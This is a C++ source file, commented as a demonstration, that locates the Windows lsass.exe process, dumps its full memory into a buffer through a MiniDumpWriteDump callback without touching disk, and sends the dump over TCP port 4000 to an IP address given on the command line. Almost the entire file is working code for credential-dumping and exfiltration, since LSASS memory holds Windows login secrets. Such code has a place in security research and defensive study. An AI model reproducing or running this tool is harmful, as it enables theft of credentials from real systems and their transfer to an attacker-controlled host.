#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")
#pragma comment (lib, "DbgHelp.lib")

#define success(str) std::cout << "[+] " << str << std::endl
#define error(str) std::cout << "[-] " << str << std::endl
#define info(str) std::cout << "[*] " << str << std::endl

//Allocating the memory where the dump is going to be stored
DWORD dumpBufferSize = (1024 * 1024 * 75); //75MB, this takes a snapshot of a processes current memory in its entirety so the resulting file is VERY large
LPVOID dumpBuffer = VirtualAlloc(NULL, dumpBufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
DWORD bytesRead = 0;

//Callback function for MiniDumpWriteDump
BOOL CALLBACK MinidumpCallback(
	PVOID CallbackParam,
	PMINIDUMP_CALLBACK_INPUT CallbackInput,
	PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	LPVOID source = 0, destination = 0; //Makes the memcpy call more readable
	DWORD bufferSize = 0; //How many bytes are in the current function call

	switch (CallbackInput->CallbackType)
	{
	//Startup calltype
	case IoStartCallback:
		CallbackOutput->Status = S_FALSE; //MSDN call for this on the calltype
		break;
	//Calltype that deals with IO information
	case IoWriteAllCallback:
		CallbackOutput->Status = S_OK; //MSDN calls for this with successful operations, since this is just conceptual minor error checks are not done

		source = CallbackInput->Io.Buffer; //Stores the first memory address of this cycles buffer
		
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset); //Stores memory address to write buffer to
		//Io.Offset stores the total offset of the dumped data (first byte would be at offset 0, 10th byte at offset 9, etc)

		bufferSize = CallbackInput->Io.BufferBytes; //Gets the buffer size of the current function call

		bytesRead += bufferSize; //Adds the buffersize to the total buffer size
		//this is used to keep track on the actual resulting file size memory was allocated to an arbitrary number of bytes that should be large enough to hold a dump

		RtlCopyMemory(destination, source, bufferSize); //macro for memcpy(destination, source, bufferSize)
		//while this could be done without the source and destination varuables they make it easier to read for this demonstration

		info("Minidump offset " + std::to_string(CallbackInput->Io.Offset) + " Size: " + std::to_string(bufferSize)); //Info on the current offset and the size of the buffer in the current loop
		break;
	//Finished calltype
	case IoFinishCallback:
		CallbackOutput->Status = S_OK; //MSDB calls for this on the calltype
		break;
	default:
		return true;
	}
	return TRUE;
}

//Gets the process ID of a given process
DWORD GetProcID(LPCWSTR procName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //Gets a snapshot of all processes currently running on the system

	//Defining structures to loop through the data
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32); //Called for by MSDN

	if (Process32First(snapshot, &procEntry)) //Only searches if the function is successful
	{
		do
		{
			if (_wcsicmp(procEntry.szExeFile, procName) == 0) //Compares wide strings case insensitivly
			{
				CloseHandle(snapshot);
				return procEntry.th32ProcessID; //Returns process ID of found process
			}
		} while (Process32Next(snapshot, &procEntry));
	}
	CloseHandle(snapshot);
	return NULL; //Returns NULL if process isn't found
}

int main(int argc, char* argv[])
{
	if (argc < 2) //Please use the demo properly
	{
		std::cout << "Usage: .\\procdump.exe <IP>" << std::endl;
	}
	const char* ip = argv[1];
	int port = 4000;

	DWORD PID = GetProcID(L"lsass.exe"); //Process to dump, using lsass.exe in this example since it has real world use that can be tested
	if (PID == NULL) //Checks if GetProcID failed
	{
		error("Unable to get process ID");
		return 0;
	}

	info("Process ID " + std::to_string(PID));

	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); //Getting a handle to the needed process for MiniDumpWriteDump
	if (proc == NULL)
	{
		error("OpenProcess error " + std::to_string(GetLastError()));
		return 0;
	}

	info("Process handled open");

	//This defined the callback information telling the API to run the callback function with each iteration of the dumped data
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION)); //Best practice with most WINAPI structs
	callbackInfo.CallbackParam = NULL; //No parameters in this example, normally would be a pointer to either a varuable to structure you want to pass
	callbackInfo.CallbackRoutine = &MinidumpCallback; //Memory address of the function to callback to

	if (MiniDumpWriteDump(proc, PID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo)) //Creates the memory snapshot with the file handle NULL so it won't write to file
		//calls the callback function so assuming no errors happen a version of the file will be stored in the allocated memory
	{
		success("Lsass.exe dumped to memory!");
		DWORD bytesWritten = 0;

		//Creating socket information to pass along data
		WSAData data;
		WSAStartup(MAKEWORD(2, 2), &data);
		
		SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(port);
		InetPtonA(AF_INET, ip, &addr.sin_addr);

		info("Trying to connect to server on port 4000");

		//Waits for successful connection to server
		while (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0)
		{
			Sleep(1000);
		}
		info("Connected to server");
		info("Sending buffer");

		//Defines the buffer of data to send and the total sent byte count to keep track of what bytes to send and when all bytes have been sent
		char buffer[1024];
		long totalbytesSent = 0;
		while (totalbytesSent < bytesRead) //If totalbytessent is equal to bytesRead (stores the memory dump size of the file) all bytes have been sent
		{
			std::cout << "\b\033\r" << std::to_string(totalbytesSent) << "/" << std::to_string(bytesRead) << std::flush; //Prints the number of bytes sent/total number of bytes
			int bytesToCopy = min(sizeof(buffer), bytesRead - totalbytesSent); //Gets what numbers less, the buffer size or the number of bytes that still need to be sent
			//this is because if the bytes to be sent is less than the buffer size and you try to send more than that its going to start sending unknown data

			memcpy(buffer, (char*)dumpBuffer + totalbytesSent, bytesToCopy); //Copies memory region to send to the buffer

			int bytesSent = send(sock, buffer, bytesToCopy, 0); //Sends the data
			if (bytesSent == SOCKET_ERROR) //An error occured on send
			{
				break;
			}
			totalbytesSent += bytesSent; //Tracks the total number of bytes sent
		}
		closesocket(sock);
		std::cout << std::endl;
		success("Buffer (hopefully) sent!");
	}
	else
	{
		error("Unable to dump lsass memory " + std::to_string(GetLastError()));
	}
	//Cleanup
	CloseHandle(proc);

	VirtualFree(dumpBuffer, 0, MEM_RELEASE);
	WSACleanup();

	return 0;
}
